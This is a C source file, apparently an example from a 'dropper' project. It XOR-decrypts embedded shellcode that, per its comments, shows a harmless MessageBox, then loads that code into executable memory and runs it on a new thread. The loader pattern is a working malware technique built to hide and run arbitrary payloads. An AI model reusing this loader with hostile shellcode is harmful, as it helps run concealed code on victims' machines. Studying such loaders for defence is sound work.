/**
 * @file examples/pe/ex4.c
 * @author adamr88 (adamr88@github.com)
 * @brief Encrypted WinAPI Windows Subsystem MessageBox shellcode
 * @version 0.1
 * @date 2024-01-04
 *
 * @copyright Copyright (c) 2024
 *
 */

#ifdef _WIN32
#include <windows.h>
#pragma comment(lib, "user32.lib")
#pragma comment(linker, "/subsystem:windows")
#else
#include <stub/windows.h>
#endif

#include <dropper/assert.h>
#include <dropper/enc.h>

enum { SRCLEN = 334, KEYLEN = 26, MAX_TIMEOUT = 4294967295 };

// "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
const unsigned char key[] = {0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
                             0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e,
                             0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
                             0x56, 0x57, 0x58, 0x59, 0x5a};

unsigned char src[] = {
    // TITLE="Message Box"
    // TEXT="Press okay to continue ... "
    0xbd, 0x0a, 0xc2, 0xa0, 0xb5, 0xb9, 0xb8, 0xb7, 0xa1, 0x9a, 0x4b, 0x4c,
    0x4d, 0x0f, 0x1e, 0x11, 0x01, 0x00, 0x02, 0x02, 0x1d, 0x67, 0x85, 0x3d,
    0x11, 0xd1, 0x13, 0x22, 0x7d, 0x0c, 0xce, 0x14, 0x5f, 0x76, 0x01, 0xc1,
    0x19, 0x6c, 0x73, 0x06, 0xc4, 0x22, 0x01, 0x6c, 0x1b, 0x5b, 0xe2, 0x1c,
    0x1d, 0x15, 0x68, 0x93, 0x09, 0x73, 0x83, 0xe8, 0x79, 0x27, 0x3b, 0x4a,
    0x65, 0x6a, 0x0a, 0x8d, 0x84, 0x43, 0x0e, 0x51, 0x90, 0xb0, 0xbe, 0x06,
    0x14, 0x07, 0x69, 0x10, 0xd2, 0x08, 0x61, 0x7c, 0xc8, 0x06, 0x79, 0x0e,
    0x46, 0x98, 0x77, 0xc1, 0xcb, 0xc4, 0x4d, 0x4e, 0x4f, 0x18, 0xd4, 0x92,
    0x27, 0x3b, 0x1d, 0x57, 0x87, 0x08, 0x67, 0xd1, 0x09, 0x5a, 0x7d, 0x00,
    0xce, 0x06, 0x67, 0x01, 0x48, 0x9a, 0xa8, 0x10, 0x05, 0xb1, 0x86, 0x6e,
    0x10, 0xd9, 0x67, 0xdc, 0x1d, 0x57, 0x81, 0x15, 0x68, 0x93, 0x09, 0x73,
    0x83, 0xe8, 0x04, 0x87, 0x8e, 0x45, 0x08, 0x4b, 0x8a, 0x74, 0xad, 0x3b,
    0xbe, 0x6e, 0x1d, 0x51, 0x1f, 0x70, 0x5d, 0x13, 0x6e, 0x89, 0x2c, 0x8c,
    0x19, 0x7c, 0x07, 0xcf, 0x05, 0x62, 0x0e, 0x49, 0x99, 0x2c, 0x75, 0x0d,
    0xc6, 0x42, 0x07, 0x6e, 0x15, 0xd9, 0x13, 0x48, 0x1c, 0x57, 0x87, 0x66,
    0x18, 0xd1, 0x45, 0xca, 0x0b, 0x45, 0x95, 0x07, 0x1f, 0x09, 0x11, 0x14,
    0x12, 0x16, 0x0c, 0x16, 0x0e, 0x09, 0x10, 0x08, 0x1b, 0xd7, 0xb9, 0x76,
    0x16, 0x0a, 0xa6, 0xba, 0x19, 0x03, 0x1a, 0x1e, 0x7b, 0x0e, 0xcc, 0x5a,
    0xa0, 0x03, 0xb4, 0xb3, 0xb2, 0x13, 0x71, 0x18, 0xdc, 0xdf, 0x65, 0x55,
    0x55, 0x56, 0x16, 0xe2, 0x15, 0x2d, 0x67, 0x45, 0xbc, 0x91, 0x0c, 0x81,
    0x86, 0x48, 0x49, 0x4a, 0x4b, 0x72, 0x05, 0xc3, 0xda, 0x5e, 0x50, 0x52,
    0x53, 0x6a, 0x19, 0xdb, 0xd2, 0x72, 0x58, 0x5a, 0x41, 0x0a, 0x72, 0x8d,
    0x04, 0xfc, 0x02, 0xcb, 0x1f, 0x4d, 0xb4, 0x99, 0x05, 0x7f, 0x86, 0x11,
    0xeb, 0xa2, 0xe6, 0xf6, 0x03, 0xa9, 0x82, 0x08, 0x2b, 0x3f, 0x32, 0x31,
    0x63, 0x2b, 0x2e, 0x27, 0x3e, 0x68, 0x3d, 0x25, 0x6b, 0x2f, 0x22, 0x20,
    0x3b, 0x39, 0x3f, 0x27, 0x36, 0x74, 0x7b, 0x78, 0x79, 0x78, 0x59, 0x17,
    0x24, 0x31, 0x30, 0x25, 0x22, 0x23, 0x67, 0x0a, 0x26, 0x32, 0x4b, 0x39,
    0x3e, 0x2b, 0x3d, 0x63, 0x63, 0x7c, 0x37, 0x38, 0x39, 0x56};

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine,
            int nShowCmd) {
  // allocate virtual memory buf
  void *lpbuf =
      VirtualAlloc(0, SRCLEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  AssertNotNull(lpbuf, VirtualAlloc, -1 * __LINE__);

  xormut(src, SRCLEN, key, KEYLEN);

  // copy payload to virtual memory buf
  RtlMoveMemory(lpbuf, src, SRCLEN);

  // change virtual memory buf execution permissions
  DWORD lpflOldProtect = 0;
  Assert(VirtualProtect(lpbuf, SRCLEN, PAGE_EXECUTE_READ, &lpflOldProtect));

  // execute payload (in thread/subprocess)
  HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpbuf, 0, 0, 0);
  AssertNotNull(th, CreateThread, -1 * __LINE__);

  // clean up threads and memory
  WaitForSingleObject(th, MAX_TIMEOUT);
  Assert(CloseHandle(th));
  Assert(VirtualFree(lpbuf, SRCLEN, MEM_RELEASE));
  return 0;
}

#ifndef _WIN32
int main() {
  WinMain((NULL), (NULL), (NULL), -1);
  return 0;
}
#endif

/**
 * @note
 * See examples/pe/ex3.c for payload creation details
 *
 */